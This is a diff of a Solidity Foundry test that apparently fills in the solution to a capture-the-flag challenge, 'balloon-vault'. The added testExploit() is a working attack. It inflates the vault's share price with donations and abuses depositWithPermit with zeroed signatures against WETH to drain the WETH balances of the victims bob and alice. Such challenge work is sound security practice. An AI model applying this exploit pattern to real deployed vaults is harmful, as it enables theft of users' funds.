@@ -2,20 +2,11 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-
 import {WETH} from "../src/5_balloon-vault/WETH.sol";
 import {BallonVault} from "../src/5_balloon-vault/Vault.sol";
 
-/*////////////////////////////////////////////////////////////
-//          DEFINE ANY NECESSARY CONTRACTS HERE             //
-//    If you need a contract for your hack, define it below //
-////////////////////////////////////////////////////////////*/
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
 
-
-
-/*////////////////////////////////////////////////////////////
-//                     TEST CONTRACT                        //
-////////////////////////////////////////////////////////////*/
 contract Challenge5Test is Test {
     BallonVault public vault;
     WETH public weth = new WETH();
@@ -43,19 +34,57 @@ contract Challenge5Test is Test {
 
     function testExploit() public {
         vm.startPrank(attacker);
-        /*////////////////////////////////////////////////////
-        //               Add your hack below!               //
-        //                                                  //
-        // terminal command to run the specific test:       //
-        // forge test --match-contract Challenge5Test -vvvv //
-        ////////////////////////////////////////////////////*/
 
+        weth.deposit{value: 10 ether}();
 
+        weth.approve(attacker, type(uint256).max);
 
+        while (weth.balanceOf(bob) != 0) {
+            weth.approve(address(vault), 1 wei);
+            vault.deposit(1 wei, attacker);
 
-        //==================================================//
+            weth.transferFrom(attacker, address(vault), 5 ether);
+
+            vault.depositWithPermit(
+                bob,
+                5 ether,
+                block.timestamp + 1 days,
+                0,
+                0,
+                0
+            );
+
+            uint256 maxAmount = vault.maxWithdraw(attacker);
+
+            vault.withdraw(maxAmount, attacker, attacker);
+        }
+
+        while (weth.balanceOf(alice) != 0) {
+            weth.approve(address(vault), 1 wei);
+            vault.deposit(1 wei, attacker);
+
+            weth.transferFrom(attacker, address(vault), 5 ether);
+
+            vault.depositWithPermit(
+                alice,
+                5 ether,
+                block.timestamp + 1 days,
+                0,
+                0,
+                0
+            );
+
+            uint256 maxAmount = vault.maxWithdraw(attacker);
+
+            vault.withdraw(maxAmount, attacker, attacker);
+        }
+
         vm.stopPrank();
 
-        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
+        assertGt(
+            weth.balanceOf(address(attacker)),
+            1000 ether,
+            "Attacker should have more than 1000 ether"
+        );
     }
 }
